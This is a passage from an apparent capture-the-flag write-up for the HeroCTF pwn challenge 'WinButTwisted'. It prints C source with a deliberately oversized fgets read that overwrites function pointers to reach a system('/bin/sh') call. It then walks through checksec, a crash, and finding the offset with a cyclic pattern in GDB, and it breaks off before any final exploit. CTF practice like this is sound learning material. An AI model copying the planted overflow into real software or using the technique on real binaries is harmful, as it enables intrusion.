In this challenge we were given a binary and a C file, let's analyze them.
```C
#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <sys/types.h>



int UNLOCKED = 0;



void set_lock()

{

    printf("Setting lock !");

    UNLOCKED = 1;

}



void shell()

{

    printf("In shell function ! ");

    if (UNLOCKED == 1)

    {

        printf("Getting shell ! ");

        setreuid(geteuid(), geteuid());

        system("/bin/sh");

    }



    

}



void hello_hero(int hero)

{

    printf("It looks like that's something a Hero would say\n");

}



void look_like()

{

    printf("Please keep being one. :)\n");

}



int main()

{

    int (*look)() = look_like;

    int (*hello)() = hello_hero;

    char buffer[32];



    printf("What would a hero say ?\n>>> ");

    fgets(buffer, 44, stdin);

    hello();

    look();



}
```
Security:
```bash
checksec WinButTwisted
[*] '/home/kali/Desktop/CTF/HeroCTF/pwn/WinButTwisted'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Uhhm it seems crashed.. 
```bash
./WinButTwisted       
What would a hero say ?
>>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./WinButTwisted
```
Now let's find the exactly offset for our padding.
Create a cyclic string in python with the Pwntools library.
```bash
>>> cyclic_metasploit(40)
b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A'
```
Run the binary into GDB 
```gdb
gefâž¤  r
Starting program: /home/kali/Desktop/CTF/HeroCTF/pwn/WinButTwisted 
What would a hero say ?
>>> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A

Program received signal SIGSEGV, Segmentation fault.
0x31624130 in ?? ()
